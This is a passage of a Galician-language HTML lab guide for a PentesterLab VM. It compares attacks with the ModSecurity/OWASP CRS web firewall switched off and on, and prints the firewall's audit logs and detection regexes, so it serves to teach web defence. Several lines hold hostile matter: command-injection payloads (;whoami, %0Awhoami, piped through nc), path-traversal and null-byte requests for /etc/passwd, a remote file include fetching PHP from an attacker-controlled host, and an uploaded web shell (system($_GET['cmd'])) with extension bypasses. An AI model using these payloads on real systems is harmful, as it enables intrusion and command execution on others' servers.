Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 10)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b>
                 ➝ [id "932105"] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ;whoami found within ARGS:ip: 192.168.120.101;whoami"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
<br />
                 ➝ Message: Access denied with code 403 (phase 2).</p>
               </ul>
             </div>
            </li>

  <div class='pagebreak'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ <br />
             <code>http://192.168.120.100/commandexec/example2.php?ip=192.168.120.101</code><br />
             <span class='red'><b><code>http://192.168.120.100/commandexec/example2.php?ip=192.168.120.101%0Awhoami</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</p></p>
             <div class='explicacion3'>
               <ul>
                 Similar ao exemplo1</b></p>
                 <pre style='white-space: pre-wrap;'>
--d5eb2d28-H--
Message: Warning. Pattern match "(?:;|\\{|\\||\\|\\||&|&&|\\n|\\r|\\$\\(|\\$\\(\\(|`|\\${|<\\(|>\\(|\\(\\s*\\))\\s*(?:{|\\s*\\(\\s*|\\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\".*\")\\s+|!\\s*|
\\$)*\\s*(?:'|\")*(?:[\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\"\\./\\\\]+/)?[\\\\'\"]*(?:s[\\\\'\"]* ..." at ARGS:ip. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line
 "158"] [id "932105"] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: \x0awhoami found within ARGS:ip: 192.168.120.101\x0awhoami"] [severity "CRITICAL"] [ver "OWASP_CRS/3.
3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Pattern match "(?i)(?:;|\\{|\\||\\|\\||&|&&|\\n|\\r|`)\\s*[\\(,@\\'\"\\s]*(?:[\\w'\"\\./]+/|[\\\\'\"\\^]*\\w[\\\\'\"\\^]*:.*\\\\|[\\^\\.\\w '\"/\\\\]*\\\\)?[\"\\^]*(?:s[\"\\^]*(
?:y[\"\\^]*s[\"\\^]*(?:t[\"\\^]*e[\"\\^]*m[\"\\^]*(?:p[\"\\^]*r[\"\\^]*o[\"\\^]*p[\"\\^]*e ..." at ARGS:ip. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line
 "294"] [id "932115"] [msg "Remote Command Execution: Windows Command Injection"] [data "Matched Data: \x0awhoami found within ARGS:ip: 192.168.120.101\x0awhoami"] [severity "CRITICAL"] [ver "OWASP_CRS
/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-windows"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"]
 [msg "Inbound Anomaly Score Exceeded (Total Score: 10)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generi
c"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "932105"] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: \x0awhoami found within ARGS:ip: 192.168.120.101\x0awhoami"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>

            </li>

            <li><p><i><span class='BookmarkTitle-Level-5'>Example 3</span></i> ➝ 
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ telnet 192.168.120.100 80</code></b></p>
              <p class='mleftsubsx2'><span class='red'><b><code>echo -en &quot;GET /commandexec/example3.php?ip=127.0.0.1;whoami HTTP/1.0 \r\n\r\n&quot; | \ <br />nc 192.168.120.100 80</code></b></p>
            </li>

          </ol>

  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs'><i><b><span class='BookmarkTitle-Level-3'>Directory Traversal</span></b></i></li>
  <div class='minindent'>&nbsp;</div>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity DESACTIVADO</span></span></b></i>
          <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2dismod security2 <span class='explicacion'>#Deshabilitar o módulo security2 que permite desactivar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
            </ul>
          </div>
          <ol type="a" class='arriba mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example1.php?file=hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example1.php?file=../../../../../../../../../etc/passwd</code></b></p>
            </li>
	    <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code></b></p>
            </li>
	    <li><p><i><span class='BookmarkTitle-Level-5'>Example 3</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example3.php?file=hacker</code> ➝</p>
	      <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example3.php?file=../../../../../etc/passwd%00hacker</code></b></a></p>
            </li>
          </ol>
  <div class='minindent'>&nbsp;</div>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity ACTIVADO</span></span></b></i>
            <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2enmod security2 <span class='explicacion'>#Habilitar o módulo security2 que permite activar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
              <li>tail -f /var/log/apache2/modsec_audit.log <span class='explicacion'> #Deixar aberto o ficheiro /var/log/apache2/modsec_audit.log para lectura, comenzando a ver polas 10 últimas liñas.</span></li>
            </ul>
          </div>



          <ol type="a" class='arriba mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example1.php?file=hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example1.php?file=../../../../../../../../../etc/passwd</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</p></p>
             <div class='explicacion3'>
               <ul>
                 Agora non se amosa o contido do ficheiro /etc/passwd. Isto é debido a que agora está activado o módulo security2 (modsecurity). De feito, revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que una regra de OWASP (OWASP_CRS/3.3.2) detecta o intento de execución de comandos na sección H:</b></p>
                 <pre style='white-space: pre-wrap;'>
--1b9ab123-H--
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "47"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /dirtrav/example1.php?file=../../../../../../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
...
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "71"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 33)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>


	    <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/hacker.png</code> ➝</p>
              <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</b></p>
             <div class='explicacion3' style='margin-left:-60px;'>
               <ul>
                 <b>Similar ao exemplo1</b></p>
                 <pre style='white-space: pre-wrap;'>
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "47"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /dirtrav/example2.php?file=/var/www/files/../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
...
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "71"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: /var/www/files/../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 33)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: /var/www/files/../../../../hacker.png"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>


            </li>
	    <li><p><i><span class='BookmarkTitle-Level-5'>Example 3</span></i> ➝ Imaxe ➝ Clic botón dereito ➝ 
              <p class='mleftsubsx4 arribasubsmini2'><code>http://192.168.120.100/dirtrav/example3.php?file=hacker</code> ➝</p>
	      <p class='mleftsubsx4'><span class='red'><b><code>http://192.168.120.100/dirtrav/example3.php?file=../../../../../etc/passwd%00hacker</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</b></p>
             <div class='explicacion3' style='margin-left:-60px;'>
               <ul>
                 <b>Similar ao exemplo1</b></p>
                 <pre style='white-space: pre-wrap;'>
--e2b6761a-H--
Message: Warning. Found 1 byte(s) in REQUEST_URI outside range: 1-255. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "516"] [id "920270"] [msg "Invalid character in request (null character)"] [data "REQUEST_URI=/dirtrav/example3.php?file=../../../../../etc/passwd\x00hacker"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"]
...
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "71"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwdhacker"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 63)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "920270"] [msg "Invalid character in request (null character)"] [data "REQUEST_URI=/dirtrav/example3.php?file=../../../../../etc/passwd\x00hacker"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
                 <br />
                 ➝ [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwdhacker"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
                 <br />
                 ➝ [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>


            </li>
          </ol>


  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs'><p><i><b><span class='BookmarkTitle-Level-3'>File Include</span></b></i></li>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity DESACTIVADO</span></span></b></i>
          <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2dismod security2 <span class='explicacion'>#Deshabilitar o módulo security2 que permite desactivar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
            </ul>
          </div>
          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
              <p class='mleftsubsx4'><code>http://192.168.120.100/fileincl/example1.php?page=intro.php</code> ➝ </p>
              <p class='mleftsubsx4'><b>LFI</b> ➝
                <span class='red'><b><code>http://192.168.120.100/fileincl/example1.php?page=../../../../../etc/passwd</code></b></p>
            </li>
  <div class='minindent'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝<br />
              <p class='mleftsubsx4'>http://192.168.120.100/fileincl/example2.php?page=intro ➝ </p>
              <p class='mleftsubsx4'><span class='cblack'><b>LFI</b> ➝</span>
                <span class='red'><b><code>http://192.168.120.100/fileincl/example2.php?page=../../../../../etc/passwd</code></b></p>
              <p class='mleftsubsx4'><span class='cblack'><b>RFI</b> ➝</span>
              <span class='red'>Apagar MV PentesterLab ➝ Cambiar configuración rede ➝ eth0 rede Interna e eth1 NAT ➝ Iniciar ➝ Configurar de novo eth0 ➝ Dende MV Kali(cliente) probar: </span></p>
              <p class='mleftsubsx3'> ➝ <b><span class='red'><code>http://192.168.120.100/fileincl/example2.php?page=https://www.google.es/index</code></span></b></p>
              <p class='mleftsubsx3'> ➝ <b><span class='red'><code>http://192.168.120.100/fileincl/example2.php?page=https://www.edu.xunta.gal/index</code></span></b></p>
              <p class='mleftsubsx3'> ➝ <span class='red'> Na máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/var/www/html/index.php</i>
                    <pre>
                    &lt;?php
                      phpinfo();
                    ?&gt;
                    </pre>
                  </li>
                  <li>Arrancar servidor web Apache:</span>
                    <ul class='hashtag-kali'>
                      <li>/etc/init.d/apache2 start</li>
                    </ul>
                  </li>
                </ol>
              <p class='mleftsubs'> <span class='red'><b><code>http://192.168.120.100/fileincl/example2.php?page=http://192.168.120.101/index</code></b></p>
            </li>
          </ol>

  <div class='pagebreak'>&nbsp;</div>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity ACTIVADO</span></b></i>
            <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2enmod security2 <span class='explicacion'>#Habilitar o módulo security2 que permite activar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
              <li>tail -f /var/log/apache2/modsec_audit.log <span class='explicacion'> #Deixar aberto o ficheiro /var/log/apache2/modsec_audit.log para lectura, comenzando a ver polas 10 últimas liñas.</span></li>
            </ul>
          </div>
          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
              <p class='mleftsubsx4'><code>http://192.168.120.100/fileincl/example1.php?page=intro.php</code> ➝ </p>
              <p class='mleftsubsx4'><b>LFI</b> ➝
                <span class='red'><b><code>http://192.168.120.100/fileincl/example1.php?page=../../../../../etc/passwd</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</b></p>
             <div class='explicacion3' style='margin-left:-60px;'>
               <ul>
                 <b>Similar a <i>Directory Transversal ➝ Exemplo1</i></b></p>
                 <pre style='white-space: pre-wrap;'>
--4d17e653-H--
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "47"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /fileincl/example1.php?page=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
...
Message: Warning. Matched phrase "etc/passwd" at ARGS:page. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:page: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /fileincl/example1.php?page=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>
              </li>
  <div class='minindent'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝<br />
              <p class='mleftsubsx4'>http://192.168.120.100/fileincl/example2.php?page=intro ➝ </p>
              <p class='mleftsubsx4'><span class='cblack'><b>LFI</b> ➝</span>
                <span class='red'><b><code>http://192.168.120.100/fileincl/example2.php?page=../../../../../etc/passwd</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403</b></p>
             <div class='explicacion3' style='margin-left:-60px;'>
               <ul>
                 <b>Similar a <i>Directory Transversal ➝ Exemplo1</i></b></p>
                 <pre style='white-space: pre-wrap;'>
--da8bbe33-H--
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:page. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "71"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:page: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
...
Message: Warning. Matched phrase "etc/passwd" at ARGS:page. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:page: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:page: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] 
<br />
                 ➝ Message: Access denied with code 403 (phase 2).
               </ul>
             </div>
            </li>
          </ol>

  <div class='pagebreak'>&nbsp;</div>
          <li class='mleftsubs mtopsubs'><p><i><b><span class='BookmarkTitle-Level-3'>File Upload</span></b></i></li>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity DESACTIVADO</span></span></b></i>
          <div class='explicacion3'> 
            <ul class='hashtag'>
              <li>a2dismod security2 <span class='explicacion'>#Deshabilitar o módulo security2 que permite desactivar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
            </ul>
          </div>

          <ol type="a" class='mleftsubs'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example1.php</code> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code></b> 
                  </li>
                </ol>
              </p>
            </li>
  <div class='minindent'>&nbsp;</div>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example2.php</code><br /> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code></b> ➝ Erro: NO PHP
                  <li class='mtopplus'>Renomear ficheiro file.php a file.php3 
                  <li class='mtopplus'>Subir file.php3 ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php3</code></b>
                  <li class='mtopplus'>Copiar file.php3 a file.phps ➝ Subir file.phps ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phps</code></b>
                  <li class='mtopplus'>Copiar file.php3 a file.phtml ➝ Subir file.phtml ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phtml</code></b>
             <li>Crear o arquivo <i>/tmp/file2.php3</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system($_GET['cmd']);
                    ?&gt;
                    </pre>
                  </li>
                  <li class='mtopplus'>Subir o arquivo file2.php3:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file2.php3</code></b> ➝ Erro: NO PHP
                  </li>
                  <li class='mtopplus'>Modificar URL:
                  <b><code>http://192.168.120.100/upload/images/file2.php3?cmd=whoami</code></b>
                  </li>
                </ol>
              </p>
            </li>
          </ol>
        </ol>

    <div class='pagebreak'>&nbsp;</div>
          <div class='mtopsubs'></div>
          <b><i><span class='label'><span class='BookmarkTitle-Level-4'>ModSecurity ACTIVADO</span></span></b></i>
            <div class='explicacion3'> 
            <ul class='hashtag'>
